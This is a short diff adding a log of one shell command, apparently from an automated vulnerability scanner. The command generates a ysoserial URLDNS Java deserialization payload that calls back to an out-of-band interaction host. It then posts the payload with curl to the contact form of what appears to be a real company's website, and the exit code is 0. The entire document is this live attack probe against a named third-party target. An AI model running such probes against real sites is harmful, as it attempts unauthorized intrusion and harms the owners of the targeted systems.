@@ -1,0 +1,4 @@
+# command: timeout 300 sh -c 'ysoserial URLDNS http://oob6e26e7bad1b1.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/d > /tmp/deser_$$.bin 2>/dev/null; curl -s -m 20 -o /dev/null -H '"'"'Content-Type: application/octet-stream'"'"' --data-binary @/tmp/deser_$$.bin https://www.infinitycapital.bh/contact'
+# exit_code: 0
+# ---
+
